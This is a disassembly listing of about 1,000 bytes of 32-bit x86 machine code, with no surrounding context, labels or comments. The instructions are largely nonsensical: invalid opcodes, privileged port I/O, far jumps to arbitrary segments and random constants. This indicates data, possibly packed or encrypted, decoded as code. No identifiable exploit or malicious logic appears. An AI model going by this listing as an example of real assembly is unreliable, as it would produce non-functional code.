  411a52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a53:	mov    ch,0xdf
  411a55:	out    0x4a,al
  411a57:	mov    ah,BYTE PTR [ebx+0x6a]
  411a5a:	aad    0xf7
  411a5c:	dec    esi
  411a5d:	(bad)  [eax]
  411a5f:	push   ds
  411a60:	into   
  411a61:	jne    0x411aa7
  411a63:	jne    0x411a40
  411a65:	pop    ebx
  411a66:	cmc    
  411a67:	pop    ecx
  411a68:	adc    al,0x52
  411a6a:	(bad)  
  411a6b:	and    al,0xb0
  411a6d:	jb     0x411ac2
  411a6f:	cmc    
  411a70:	pop    ebx
  411a71:	pop    es
  411a72:	dec    esi
  411a73:	mov    edx,?
  411a75:	je     0x411ad0
  411a77:	jne    0x411adf
  411a79:	add    edi,DWORD PTR [esi]
  411a7b:	sub    BYTE PTR [eax+0x717b634d],bl
  411a81:	and    ebp,0x2bad16a9
  411a87:	mov    WORD PTR [ebp+edx*4+0x59],?
  411a8b:	jne    0x411a2d
  411a8d:	mov    esp,0x2a3cd319
  411a92:	int    0x21
  411a94:	lods   eax,DWORD PTR ds:[esi]
  411a95:	jnp    0x411aa0
  411a97:	imul   BYTE PTR [esi]
  411a99:	retw   
  411a9b:	dec    eax
  411a9c:	shr    DWORD PTR [ecx+esi*4-0x54dfe8ff],1
  411aa3:	pop    ebx
  411aa4:	into   
  411aa5:	dec    ebx
  411aa6:	pop    ss
  411aa7:	cdq    
  411aa8:	fwait
  411aa9:	mov    ebx,0xaa9292d6
  411aae:	pop    es
  411aaf:	test   BYTE PTR [edx],ah
  411ab1:	mov    bl,0x95
  411ab3:	dec    edi
  411ab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ab5:	xor    eax,0x22c88e31
  411aba:	addr16 mov esp,0x6a7dcda5
  411ac0:	aas    
  411ac1:	fidivr WORD PTR [esi+esi*4]
  411ac4:	pop    es
  411ac5:	dec    esi
  411ac6:	lds    eax,FWORD PTR [ecx-0x522f2bc7]
  411acc:	daa    
  411acd:	pop    edi
  411ace:	push   eax
  411acf:	jne    0x411ae2
  411ad1:	dec    eax
  411ad2:	inc    ebp
  411ad3:	sbb    DWORD PTR [ebp+0x710632eb],esp
  411ad9:	mov    ch,0xf1
  411adb:	push   edx
  411adc:	(bad)  
  411add:	bound  edx,QWORD PTR [ebp+0x6a]
  411ae0:	ins    BYTE PTR es:[edi],dx
  411ae1:	and    BYTE PTR [ebp+0x9c71df2],al
  411ae7:	jmp    0x4a1b:0xdfd5edae
  411aee:	(bad)  [esi+0x52]
  411af1:	jbe    0x411aad
  411af3:	jl     0x411aa2
  411af5:	mov    ebx,0xcfa2d20f
  411afa:	out    dx,eax
  411afb:	pop    eax
  411afc:	mov    ah,ah
  411afe:	aad    0xfc
  411b00:	inc    ecx
  411b01:	hlt    
  411b02:	test   al,0x23
  411b04:	add    bl,BYTE PTR [si-0x17]
  411b08:	dec    ebp
  411b09:	and    bh,cl
  411b0b:	mov    esi,DWORD PTR [ebx+0x3f]
  411b0e:	mov    ch,0xf4
  411b10:	mov    esi,0xd9bbd529
  411b15:	out    0x96,al
  411b17:	jnp    0x411ae0
  411b19:	sbb    DWORD PTR [eax-0x52],0xffffff80
  411b1d:	mov    esi,0x2c82b4d5
  411b22:	push   esp
  411b23:	or     BYTE PTR [edx-0x6c8f2a8e],ch
  411b29:	adc    ah,ch
  411b2b:	push   cs
  411b2c:	pusha  
  411b2d:	into   
  411b2e:	push   ss
  411b2f:	xchg   esp,eax
  411b30:	mov    ecx,0x5075b752
  411b35:	mov    bl,BYTE PTR [edi+0x4c93107a]
  411b3b:	jge    0x411b13
  411b3d:	mov    eax,0xce31c203
  411b42:	popf   
  411b43:	dec    ecx
  411b44:	rcr    DWORD PTR [edi],cl
  411b46:	fmul   st(5),st
  411b48:	enter  0x2fe5,0x62
  411b4c:	and    esp,DWORD PTR [edi-0x2b]
  411b4f:	fild   WORD PTR [eax-0x4dcb9496]
  411b55:	fnsave gs:[esi+esi*4+0x50]
  411b5a:	sbb    DWORD PTR [ecx-0x50],ecx
  411b5d:	lahf   
  411b5e:	pushf  
  411b5f:	div    DWORD PTR [edx+0x51]
  411b62:	(bad)  
  411b63:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  411b65:	adc    al,0x9f
  411b67:	in     eax,0x3d
  411b69:	sbb    al,0x80
  411b6b:	jne    0x411b8c
  411b6d:	rcl    eax,1
  411b6f:	sbb    DWORD PTR [eax+0x71ff5806],0xffffffb9
  411b76:	jl     0x411b7e
  411b78:	jnp    0x411b1a
  411b7a:	push   ebp
  411b7b:	jno    0x411b34
  411b7d:	pop    ss
  411b7e:	mov    esi,0xb53b8e75
  411b83:	cmp    DWORD PTR [edi],0xe766aa7a
  411b89:	or     edx,esi
  411b8b:	adc    ebp,DWORD PTR [ebp+0x666b917d]
  411b91:	sub    DWORD PTR [esi],eax
  411b93:	jne    0x411b3f
  411b95:	pop    esi
  411b96:	jl     0x411bb2
  411b98:	cmp    al,0x82
  411b9a:	mov    ds:0xc9a8710e,al
  411b9f:	lock or DWORD PTR [eax+0x3d],esi
  411ba3:	out    dx,eax
  411ba4:	add    ah,BYTE PTR [edi]
  411ba6:	push   esi
  411ba7:	mov    edi,0xb527178e
  411bac:	pop    ss
  411bad:	sbb    DWORD PTR [ecx-0x4ec68e99],edi
  411bb3:	jmp    0x411b52
  411bb5:	cli    
  411bb6:	pop    ss
  411bb7:	xchg   ebp,eax
  411bb8:	mov    esi,0x10ec1e1f
  411bbd:	psrld  mm3,QWORD PTR [ecx]
  411bc0:	rol    BYTE PTR ds:0x63318224,0xe0
  411bc7:	pop    ds
  411bc8:	jmp    0xba9f:0x4076b89c
  411bcf:	cdq    
  411bd0:	mov    ebp,0xfc41ab3e
  411bd5:	mov    esi,0x498944dc
  411bda:	lods   eax,DWORD PTR ds:[esi]
  411bdb:	adc    BYTE PTR [ecx+0x27],ah
  411bde:	outs   dx,BYTE PTR ds:[esi]
  411bdf:	mov    DWORD PTR [eax+0x57f0471f],0x169feb4d
  411be9:	ja     0x411bc7
  411beb:	retf   0xe560
  411bee:	dec    eax
  411bef:	mov    WORD PTR [ecx-0x2],?
  411bf2:	in     eax,0x95
  411bf4:	dec    eax
  411bf5:	and    dl,cl
  411bf7:	ins    DWORD PTR es:[edi],dx
  411bf8:	hlt    
  411bf9:	loopne 0x411c09
  411bfb:	dec    esi
  411bfc:	pop    esp
  411bfd:	(bad)  
  411bfe:	fiadd  WORD PTR [esi]
  411c00:	and    ebx,DWORD PTR [ebx+0x1a]
  411c03:	jne    0x411bbe
  411c05:	rol    BYTE PTR [eax+0x3a],cl
  411c08:	push   esp
  411c09:	pop    edi
  411c0a:	push   ecx
  411c0b:	inc    esi
  411c0c:	jno    0x411bca
  411c0e:	and    dl,BYTE PTR [edx-0x8]
  411c11:	mov    eax,0x2071c18c
  411c16:	pop    es
  411c17:	xchg   esi,eax
  411c18:	mov    bl,0xeb
  411c1a:	inc    edx
  411c1b:	stc    
  411c1c:	xlat   BYTE PTR ds:[ebx]
  411c1d:	pop    ds
  411c1e:	les    ecx,FWORD PTR [eax+0x785cf8f1]
  411c24:	cld    
  411c25:	adc    ch,0xb5
  411c28:	xchg   ebx,eax
  411c29:	fsub   DWORD PTR [edi+0x74]
  411c2c:	test   al,0x83
  411c2e:	mov    esp,0xef204c2d
  411c33:	mov    esi,0x994dcac4
  411c38:	xor    eax,0xaeeec99f
  411c3d:	mov    al,0x96
  411c3f:	cmc    
  411c40:	pop    ds
  411c41:	pop    ebx
  411c42:	(bad)  
  411c44:	xchg   DWORD PTR [edi],edi
  411c46:	push   ebp
  411c47:	jne    0x411c97
  411c49:	mov    ah,0xf9
  411c4b:	out    dx,eax
  411c4c:	jge    0x411bda
  411c4e:	push   DWORD PTR [edx]
  411c50:	jno    0x411c28
  411c52:	(bad)  
  411c54:	xor    DWORD PTR [eax-0x2a],edi
  411c57:	adc    al,0xe9
  411c59:	or     ebx,DWORD PTR [eax+0x78]
  411c5c:	or     eax,0x63546468
  411c61:	stc    
  411c62:	gs xchg edi,eax
  411c64:	push   ss
  411c65:	fwait
  411c66:	aad    0xf4
  411c68:	retf   0x1f5d
  411c6b:	xchg   esp,eax
  411c6c:	push   esi
  411c6d:	or     dh,BYTE PTR [edx+0x20d9dd75]
  411c73:	(bad)  
  411c74:	dec    edx
  411c75:	sahf   
  411c76:	cwde   
  411c77:	ss je  0x411c2d
  411c7a:	inc    edi
  411c7b:	imul   edi,DWORD PTR [esi],0xd4456903
  411c81:	popa   
  411c82:	add    dh,BYTE PTR [ebp+0xb]
  411c85:	fld    DWORD PTR [esi-0x20487910]
  411c8b:	xchg   ebx,eax
  411c8c:	jno    0x411ca0
  411c8e:	jecxz  0x411ccc
  411c90:	push   cs
  411c91:	jmp    0x2029b6a9
  411c96:	add    DWORD PTR [ecx-0x71c123e],ebx
  411c9c:	addr16 in eax,0xd5
  411c9f:	and    eax,0x1d0b6ccd
  411ca4:	and    bh,ah
  411ca6:	inc    ebx
  411ca7:	jne    0x411d12
  411ca9:	(bad)  
  411caa:	scas   al,BYTE PTR es:[edi]
  411cab:	ror    DWORD PTR [ebp+ebx*4+0x42],cl
  411caf:	push   edx
  411cb0:	scas   al,BYTE PTR es:[edi]
  411cb1:	dec    esp
  411cb2:	ja     0x411ce6
  411cb4:	ja     0x411c55
  411cb6:	repz cmc 
  411cb8:	inc    ebp
  411cb9:	leave  
  411cba:	lods   al,BYTE PTR ds:[esi]
  411cbb:	push   0x75581d97
  411cc0:	fisttp DWORD PTR [eax]
  411cc2:	scas   eax,DWORD PTR es:[edi]
  411cc3:	mov    edx,0x94adafc7
  411cc8:	jno    0x411c54
  411cca:	pop    ss
  411ccb:	sub    BYTE PTR [edi],ch
  411ccd:	sbb    BYTE PTR [esi],0xe8
  411cd0:	pop    esp
  411cd1:	das    
  411cd2:	imul   edi,DWORD PTR [ebx+ebx*8-0x7d],0xccc3135
  411cda:	hlt    
  411cdb:	or     edi,DWORD PTR [ecx+ebx*2-0x4b]
  411cdf:	cmp    BYTE PTR [edi+0x1f],dh
  411ce2:	mov    ebx,0x6538a6fc
  411ce7:	sub    DWORD PTR [ebx+eiz*2-0x41],0x68
  411cec:	push   ecx
  411ced:	push   ebx
  411cee:	pop    eax
  411cef:	retf   
  411cf0:	pushf  
  411cf1:	dec    eax
  411cf2:	repnz cmp DWORD PTR [eax+0x7e],esi
  411cf6:	aad    0x29
  411cf8:	cmp    eax,0x94304998
  411cfd:	pop    ds
  411cfe:	sbb    edi,DWORD PTR [ebx+0x3]
  411d01:	les    edx,FWORD PTR [edx]
  411d03:	lods   al,BYTE PTR ds:[esi]
  411d04:	and    BYTE PTR [ebp-0x1e668a1d],dh
  411d0a:	sbb    al,0x55
  411d0c:	sub    BYTE PTR [ecx+0x15],dh
  411d0f:	dec    edi
  411d10:	jo     0x411d32
  411d12:	jge    0x411cca
  411d14:	push   ebp
  411d15:	mov    ebp,0xb21b2128
  411d1a:	aad    0x39
  411d1c:	xchg   edx,eax
  411d1d:	stos   DWORD PTR es:[edi],eax
  411d1e:	sub    dh,dl
  411d20:	and    BYTE PTR [eax],bh
  411d22:	bnd je 0x411d83
  411d25:	xor    esp,DWORD PTR [esi-0x44608870]
  411d2b:	loop   0x411d9e
  411d2d:	fwait
  411d2e:	jns    0x411cf6
  411d30:	jbe    0x411d29
  411d32:	ja     0x411d57
  411d34:	mov    eax,ds:0x5e29272a
  411d39:	xor    DWORD PTR [esi+0x20],ebx
  411d3c:	icebp  
  411d3d:	dec    esi
  411d3e:	cmp    al,ch
  411d40:	ss shl edx,0x67
  411d44:	and    DWORD PTR [edx-0x24],ebp
  411d47:	pop    edx
  411d48:	stos   BYTE PTR es:[edi],al
  411d49:	pop    edi
  411d4a:	push   ebp
  411d4b:	shl    DWORD PTR [edx+0x5574def3],cl
  411d51:	adc    DWORD PTR [edi+0x66ff7d4c],edx
  411d57:	out    dx,eax
  411d58:	js     0x411d05
  411d5a:	(bad)  
  411d5c:	push   0xbd8de573
  411d61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d62:	xchg   esp,eax
  411d63:	and    DWORD PTR [ebx-0x1f],0x7d
  411d67:	(bad)  
  411d68:	call   0x2cf7:0xcdd560f
  411d6f:	inc    esp
  411d70:	(bad)  
  411d71:	int3   
  411d72:	cld    
  411d73:	xchg   edx,eax
  411d74:	rol    BYTE PTR [esi+edx*2],1
  411d77:	sub    esi,DWORD PTR [ebp-0x426bb984]
  411d7d:	and    al,cl
  411d7f:	sbb    esi,DWORD PTR [eax+esi*1+0x70543e29]
  411d86:	mov    ch,0xb
  411d88:	inc    edx
  411d89:	loop   0x411d60
  411d8b:	push   cs
  411d8c:	mov    bh,0xc
  411d8e:	sti    
  411d8f:	call   0x77906c8d
  411d94:	cmp    DWORD PTR [esi+0x2d],0x25
  411d98:	mov    edi,0x9a2335c3
  411d9d:	mov    eax,0xbf248ff3
  411da2:	adc    BYTE PTR [eax+0x7c],bh
  411da5:	pusha  
  411da6:	stos   DWORD PTR es:[edi],eax
  411da7:	fldz   
  411da9:	lahf   
  411daa:	pop    esi
  411dab:	iret   
  411dac:	mov    eax,0xef750313
  411db1:	rcr    edx,0x39
  411db4:	test   DWORD PTR [ebx+ecx*8-0x5],eax
  411db8:	nop
  411db9:	iret   
  411dba:	add    BYTE PTR [eax],dh
  411dbc:	cmp    esi,DWORD PTR [ebx+0x7a]
  411dbf:	dec    ebx
  411dc0:	js     0x411dbf
  411dc2:	rcr    DWORD PTR [ebx-0x8957d8f],0x68
  411dc9:	and    dh,ah
  411dcb:	add    eax,0xa3a23653
  411dd0:	adc    esp,DWORD PTR [ecx+0xd1f90e4]
  411dd6:	mov    ch,0xb3
  411dd8:	icebp  
  411dd9:	jns    0x411d66
  411ddb:	clc    
  411ddc:	and    al,0xa5
  411dde:	dec    ebx
  411ddf:	jne    0x411d9f
  411de1:	movzx  edx,WORD PTR [ebp+0x1d]
  411de5:	mov    dh,0xef
  411de7:	push   ds
  411de8:	pop    ebp
  411de9:	(bad)  
  411deb:	pusha  
  411dec:	shr    BYTE PTR [edx-0x48],1
  411def:	outs   dx,DWORD PTR ds:[esi]
  411df0:	adc    bh,BYTE PTR [eax+0x30]
  411df3:	jne    0x411e2a
  411df5:	mov    edi,0xeba73263
  411dfa:	mov    ebx,0xe3c5711d
  411dff:	pop    ebx
  411e00:	and    edx,DWORD PTR [ebx+0x24c99862]
  411e06:	sub    DWORD PTR [edx+0x757fdd63],esi
  411e0c:	hlt    
  411e0d:	cld    
  411e0e:	and    ecx,DWORD PTR [ebx]
  411e10:	out    dx,eax
  411e11:	jns    0x411de8
  411e13:	pop    edx
  411e14:	icebp  
  411e15:	sub    edx,esp
  411e17:	pop    es
  411e18:	mov    ah,0x84
  411e1a:	jo     0x411e91
  411e1c:	or     ebx,ebx
  411e1e:	(bad)  
  411e1f:	cmp    eax,DWORD PTR [esi+ebp*2-0x4c]
  411e23:	sbb    al,0xc9
  411e25:	cwde   
  411e26:	and    BYTE PTR [edx+ebx*2+0x11d5c2e9],al
  411e2d:	daa    
  411e2e:	xor    eax,0x7e236a49
  411e33:	lods   eax,DWORD PTR ds:[esi]
  411e34:	cmp    al,ch
  411e36:	ret    
  411e37:	imul   ebx,DWORD PTR [ecx-0x25],0xffffffcc
  411e3b:	ds jno 0x411df0
  411e3e:	xor    ch,al
  411e40:	je     0x411e77
  411e42:	ja     0x411e8f
  411e44:	dec    esp
  411e45:	and    bh,ah
  411e47:	fldenv [esi]
  411e49:	sub    ah,BYTE PTR [esi+edx*1]
  411e4c:	dec    edi
  411e4d:	repz fdivr st(5),st
  411e50:	jmp    0x54703044
  411e55:	mov    ebx,0xf9960513
  411e5a:	dec    esp
  411e5b:	jl     0x411eb9
  411e5d:	jge    0x411e48
  411e5f:	xor    edi,DWORD PTR [eax]
  411e61:	adc    al,dh
  411e63:	mov    al,ds:0x2d59013
  411e68:	shl    DWORD PTR [ebp+0x564df59b],1
  411e6e:	das    
  411e6f:	jl     0x411e41
  411e71:	push   ss
  411e72:	nop
  411e73:	addr16 push edx
  411e75:	loopne 0x411e1c
  411e77:	mov    edi,0x1fd5ed4b
  411e7c:	adc    ah,cl
  411e7e:	ja     0x411e71
  411e80:	out    0x1b,al
  411e82:	pushf  
  411e83:	jbe    0x411e28
  411e85:	cmp    al,0x58
  411e87:	dec    esi
  411e88:	pop    ecx
  411e89:	push   0xdafcb6b1
  411e8e:	inc    ebx
  411e8f:	dec    ecx
  411e90:	into   
  411e91:	call   0xaeb24357
  411e96:	(bad)  
  411e97:	(bad)  
  411e98:	fs push cs
  411e9a:	data16 daa 
  411e9c:	lock pop ds
  411e9e:	hlt    
  411e9f:	pop    ebx
  411ea0:	jnp    0x411e31
  411ea2:	loop   0x411edb
  411ea4:	lds    ebx,FWORD PTR [ebp-0x2b]
  411ea7:	pop    edi
  411ea8:	pop    esi
  411ea9:	ins    DWORD PTR es:[edi],dx
  411eaa:	in     al,0xf7
  411eac:	or     cl,BYTE PTR [ebx+0x26]
  411eaf:	jne    0x411ef8
  411eb1:	xchg   esp,eax
  411eb2:	(bad)  
  411eb3:	int3   
  411eb4:	or     esp,DWORD PTR [edi-0x7e55f312]
  411eba:	adc    ebp,esi
  411ebc:	inc    ecx
  411ebd:	sub    edx,DWORD PTR [edx-0x7f]
  411ec0:	(bad)  
  411ec1:	fucomi st,st(5)
  411ec3:	je     0x411f44
  411ec5:	imul   eax,DWORD PTR [eax],0x4d
  411ec8:	loopne 0x411e9f
  411eca:	adc    eax,0x27f6a9ac
  411ecf:	jbe    0x411e81
  411ed1:	and    eax,0x266539c
  411ed6:	inc    esi
  411ed7:	lock and esi,DWORD PTR [ebx]
  411eda:	pop    edi
  411edb:	push   ss
  411edc:	ror    edi,cl
  411ede:	sub    BYTE PTR [ebx-0x57a9b18f],bl
  411ee4:	(bad)  
  411ee5:	pusha  
  411ee6:	popa   
  411ee7:	rcl    DWORD PTR [eax+eiz*1],cl
  411eea:	sub    BYTE PTR [ebx],cl
  411eec:	dec    ebp
  411eed:	cmp    esi,esi
  411eef:	scas   al,BYTE PTR es:[edi]
  411ef0:	sti    
  411ef1:	(bad)
  411ef4:	add    al,0xb5
  411ef6:	rcl    DWORD PTR [ebx+0x788947ca],1
  411efc:	repz adc DWORD PTR ss:[eax],0x499e9d7b
  411f04:	push   cs
  411f05:	or     BYTE PTR [edx+0x6c],dh
  411f08:	jno    0x411ef8
  411f0a:	jmp    0x48b4:0x4f282156
  411f11:	and    ebx,DWORD PTR [edx]
  411f13:	call   FWORD PTR [edi+0x15]
  411f16:	adc    al,0x49
  411f18:	or     DWORD PTR [ebp+ebx*4+0x71],ebp
  411f1c:	jno    0x411eaa
  411f1e:	sub    DWORD PTR [eax-0x5e],ecx
  411f21:	adc    BYTE PTR [ebx-0x4a],bl
  411f24:	jb     0x411f45
  411f26:	imul   dh
  411f28:	cs dec esi
  411f2a:	push   ebx
  411f2b:	test   DWORD PTR [esi],edx
  411f2d:	in     al,dx
  411f2e:	fmul   st,st(6)
  411f30:	ins    DWORD PTR es:[edi],dx
  411f31:	dec    edx
  411f32:	enter  0xe877,0x8
  411f36:	repnz cli 
  411f38:	inc    esi
  411f39:	and    ebx,DWORD PTR [ecx+0x3b4ba8ad]
  411f3f:	mov    al,ds:0xb3e5261b
  411f44:	jmp    FWORD PTR [ecx-0x772caa2b]
  411f4a:	push   es
  411f4b:	cs das 
  411f4d:	les    ebx,FWORD PTR [ebx]
  411f4f:	jne    0x411fac
  411f51:	or     ecx,DWORD PTR [esi+eax*4]
  411f54:	adc    DWORD PTR [ebp-0x449ad3cd],ebp
  411f5a:	aad    0x70
  411f5c:	aam    0xb
  411f5e:	xor    edx,ecx
  411f60:	jb     0x411ee5
  411f62:	inc    edi
  411f63:	jne    0x411f7d
  411f65:	test   BYTE PTR [edx-0x6f],0x39
  411f69:	or     DWORD PTR [esp+eiz*8],esi
  411f6c:	jno    0x411f8a
  411f6e:	in     al,0xdf
  411f70:	addr16 pop es
  411f72:	fst    DWORD PTR [ecx-0x21]
  411f75:	pop    ds
  411f76:	adc    DWORD PTR cs:[esi+0x8],eax
  411f7a:	xor    DWORD PTR [eax+eax*1+0x67],ebp
  411f7e:	fcomp  QWORD PTR [ebx]
  411f80:	bound  edi,QWORD PTR [esi-0x67ce5c3f]
  411f86:	inc    esp
  411f87:	mov    edx,0xe76a1faa
  411f8c:	ret    
  411f8d:	aas    
  411f8e:	test   al,0xe2
  411f90:	stos   DWORD PTR es:[edi],eax
  411f91:	stc    
  411f92:	fdiv   DWORD PTR [ebp-0x23]
  411f95:	mov    dh,0x52
  411f97:	sbb    DWORD PTR [ecx],ebx
  411f99:	mov    al,0xb5
  411f9b:	add    ah,bh
  411f9d:	pop    eax
  411f9e:	dec    eax
  411f9f:	shl    ebp,0xf
  411fa2:	add    DWORD PTR [ecx+0x3609e21a],0xffffffb1
  411fa9:	daa    
  411faa:	mov    edx,0x7e9054e2
  411faf:	lods   eax,DWORD PTR ds:[esi]
  411fb0:	jbe    0x411ff4
  411fb2:	mov    ch,0x9d
  411fb4:	mov    ds:0x984e9525,eax
  411fb9:	call   0xe629:0xda34754f
  411fc0:	loope  0x411f44
  411fc2:	enter  0x71d5,0x84
  411fc6:	nop
  411fc7:	inc    edi
  411fc8:	lock arpl WORD PTR [edx+esi*2+0x7a91fff],di
  411fd0:	enter  0x1ecf,0x28
  411fd4:	cld    
  411fd5:	and    esp,ebx
  411fd7:	mov    ch,0xe8
  411fd9:	sub    ecx,eax
  411fdb:	cmc    
  411fdc:	push   ecx
  411fdd:	push   ecx
  411fde:	sbb    al,0x58
  411fe0:	ss and ch,bl
  411fe3:	(bad)  
  411fe5:	fimul  DWORD PTR ds:0xd89683d
  411feb:	js     0x411f9b
  411fed:	pop    ds
  411fee:	enter  0x347a,0xc4
  411ff2:	arpl   WORD PTR [edi+0xbea1f78],bx
  411ff8:	sub    DWORD PTR [ebp-0xf],0xffffffb5
  411ffc:	jne    0x411fb5
  411ffe:	aad    0xf9
  412000:	cmp    eax,0x3ccbba29
  412005:	and    dl,BYTE PTR [ebp+0xa299875]
  41200b:	jae    0x412024
  41200d:	retf   
  41200e:	call   0xb6c3913a
  412013:	jmp    0x2049:0x7c2cc338
  41201a:	pop    DWORD PTR [eax]
  41201c:	mov    bh,0x43
  41201e:	test   BYTE PTR [eax+0x3f],ah
  412021:	int3   
  412022:	fcomp  DWORD PTR [ecx-0xd]
  412025:	fstp   TBYTE PTR ds:0x3ff01b8e
  41202b:	sbb    al,ch
  41202d:	pop    ds
  41202e:	sub    eax,DWORD PTR [edi+0x7f03a09]
  412034:	mov    esp,0x71664e4b
  412039:	sub    ch,dh
  41203b:	jge    0x41201d
  41203d:	xor    BYTE PTR [edx+ebx*1-0x72c3e071],ah
  412044:	cmp    eax,0x3477f049
  412049:	mov    bh,0x2d
  41204b:	gs push es
  41204d:	and    DWORD PTR [ebx],ecx
  41204f:	xor    eax,0xba13543e
  412054:	cmp    DWORD PTR [edx],ecx
  412056:	add    al,0x75
  412058:	and    cl,al
  41205a:	rcr    BYTE PTR [esi+0x24],cl
  41205d:	out    dx,al
  41205e:	cmp    ah,BYTE PTR ds:0xe6d5af55
  412064:	or     BYTE PTR [esi-0x4ca0b42a],al
  41206a:	sar    BYTE PTR [esi+0x43],0xa8
  41206e:	push   ebp
  41206f:	xor    cl,0x48
  412072:	push   ebx
  412073:	(bad)
  412076:	aad    0xf5
  412078:	sub    DWORD PTR ds:0x430714ca,edi
  41207e:	mov    al,0x75
  412080:	mov    ah,0x29
  412082:	mov    ecx,DWORD PTR [ebx-0x7c]
  412085:	jge    0x412011
  412087:	xchg   esi,eax
  412088:	jno    0x41201a
  41208a:	test   al,0x60
  41208c:	cmp    BYTE PTR [esi],0x51
  41208f:	jbe    0x412089
  412091:	jnp    0x4120c2
  412093:	pop    eax
  412094:	call   0xd0f00b8
  412099:	push   eax
  41209a:	mov    edi,0xf464f161
  41209f:	push   esp
  4120a0:	dec    edx
  4120a1:	adc    BYTE PTR [ebp-0x45],0xc0
  4120a5:	cmp    BYTE PTR [ebx],dh
  4120a7:	cdq    
  4120a8:	push   esp
  4120a9:	and    BYTE PTR [eax],al
  4120ab:	add    BYTE PTR [edi],cl
  4120ad:	sbb    bh,BYTE PTR ds:0x49cf434c
  4120b3:	into   
  4120b4:	jae    0x412122
  4120b6:	cmp    eax,ecx
  4120b8:	add    ah,ch
  4120ba:	dec    edi
  4120bb:	push   ebp
  4120bc:	das    
  4120bd:	add    ah,BYTE PTR [esi]
  4120bf:	jne    0x41212e
  4120c1:	mov    bh,0xb2
  4120c3:	push   es
  4120c4:	push   0x10
  4120c6:	mov    ebx,0x797573b3
  4120cb:	pop    ds
  4120cc:	gs jne 0x41208f
  4120cf:	xor    eax,0x991fa761
  4120d4:	lahf   
  4120d5:	xor    dl,BYTE PTR [ecx]
  4120d7:	js     0x4120eb
  4120d9:	ret    0xd59f
  4120dc:	test   eax,0x716b6d13
  4120e1:	add    eax,0x711f731c
  4120e6:	int3   
  4120e7:	fmul   QWORD PTR [eax-0x587248c5]
  4120ed:	bound  esi,QWORD PTR [ecx]
  4120ef:	mov    cl,0x9a
  4120f1:	hlt    
  4120f2:	mov    ch,0x8
  4120f4:	xchg   ecx,eax
  4120f5:	loopne 0x4120cc
  4120f7:	repnz push esp
  4120f9:	inc    esi
  4120fa:	mov    edx,0x843459fe
  4120ff:	jbe    0x4120df
  412101:	jno    0x4120eb
  412103:	or     ecx,ebx
  412105:	dec    edx
  412106:	add    dl,BYTE PTR [ebp-0x622a01af]
  41210c:	scas   eax,DWORD PTR es:[edi]
  41210d:	pusha  
  41210e:	xor    al,0xc6
  412110:	aam    0xea
  412112:	lds    edi,FWORD PTR [ecx+edx*4+0x23]
  412116:	pop    ebx
  412117:	push   ecx
  412118:	mov    ebx,0x513100ff
  41211d:	ja     0x4120f4
  41211f:	pop    ebx
  412120:	imul   esi,ecx,0x958e7872
  412126:	(bad)  
  412127:	jne    0x41212e
  412129:	push   cs
  41212a:	adc    bl,bh
  41212c:	inc    ebx
  41212d:	(bad)  
  41212f:	mov    ?,WORD PTR [ecx+0xb]
  412132:	dec    ebp
  412133:	out    dx,al
  412134:	out    dx,al
  412135:	sub    BYTE PTR [ebp-0x2d],ch
  412138:	sbb    cl,BYTE PTR ss:0x5a45a975
  41213f:	pop    ss
  412140:	shl    DWORD PTR [edx-0x5c],cl
  412143:	mov    WORD PTR [ecx-0x27],?
  412146:	xchg   edi,eax
  412147:	xchg   esp,eax
  412148:	mov    esi,0x233f5d3f
  41214d:	and    al,bh
  41214f:	and    DWORD PTR [ebx-0x25],esi
  412152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412153:	retf   
  412154:	scas   eax,DWORD PTR es:[edi]
  412155:	test   BYTE PTR [ebp+0x57],ah
  412158:	jno    0x41218c
  41215a:	mov    ecx,DWORD PTR [ecx]
  41215c:	sbb    BYTE PTR [ebp+0x41],cl
  41215f:	mov    cs,WORD PTR ds:0x412d2820
  412165:	mov    eax,0xff3c1df3
  41216a:	aad    0x57
  41216c:	sub    al,0x72
  41216e:	dec    ebx
  41216f:	dec    ebp
  412170:	enter  0x5c74,0x75
  412174:	and    BYTE PTR ds:0x5c6a5e75,ch
  41217a:	adc    bh,BYTE PTR [esi]
  41217c:	jno    0x41211f
  41217e:	in     eax,dx
  41217f:	les    eax,FWORD PTR [esi]
  412181:	in     al,0x82
  412183:	popa   
  412184:	sub    al,0x27
  412186:	cmp    dl,bl
  412188:	mov    esp,0x7c2b9715
  41218d:	retf   
  41218e:	aad    0xef
  412190:	fwait
  412191:	ja     0x4121fb
  412193:	out    0xee,eax
  412195:	dec    esp
  412196:	stos   DWORD PTR es:[edi],eax
  412197:	push   edi
  412198:	mov    al,BYTE PTR [esi+edx*2-0x7]
  41219c:	mov    DWORD PTR [eax-0x79f3812b],0x1fd9541d
  4121a6:	add    eax,0x19456ad1
  4121ab:	cmp    DWORD PTR [edx+0x774ef39c],esi
  4121b1:	test   BYTE PTR [edx-0x53],bl
  4121b4:	cmp    al,0xe0
  4121b6:	xchg   esi,eax
  4121b7:	mov    ebx,esp
  4121b9:	add    eax,0x2b3b63a6
  4121be:	div    BYTE PTR [edi+0x67]
  4121c1:	test   BYTE PTR [ebp+0x5b],dl
  4121c4:	fwait
  4121c5:	repnz pusha 
  4121c7:	or     ecx,0x9c75092e
  4121cd:	iret   
  4121ce:	adc    BYTE PTR [ecx+0x66],0x7
  4121d2:	lds    esi,FWORD PTR [ebp+0x30]
  4121d5:	pop    esp
  4121d6:	jmp    0xcfc1dc75
  4121db:	fstp   TBYTE PTR [eax-0xa]
  4121de:	cmp    eax,0x139531b8
  4121e3:	mov    ch,0x12
  4121e5:	mov    al,0xcd
  4121e7:	int    0x87
  4121e9:	pop    ds
  4121ea:	neg    DWORD PTR [esi+0x41]
  4121ed:	xor    BYTE PTR [eax+edx*2+0x6edc4694],cl
  4121f4:	jbe    0x412192
  4121f6:	lock sti 
  4121f8:	and    ebp,ebx
  4121fa:	cmp    eax,0xca1fc503
  4121ff:	retw   0xb638
  412203:	inc    edi
  412204:	dec    ebx
  412205:	dec    edx
  412206:	aad    0x37
  412208:	push   ds
  412209:	loope  0x41220c
  41220b:	cmp    esi,ebp
  41220d:	shl    DWORD PTR [esi+0x696e2775],0x9b
  412214:	jae    0x412282
  412216:	andps  xmm6,XMMWORD PTR [ecx+0xf]
  41221a:	das    
  41221b:	aad    0x25
  41221d:	mov    edx,0x1fa128d0
  412222:	sub    BYTE PTR [ebx-0x39e5bdd],al
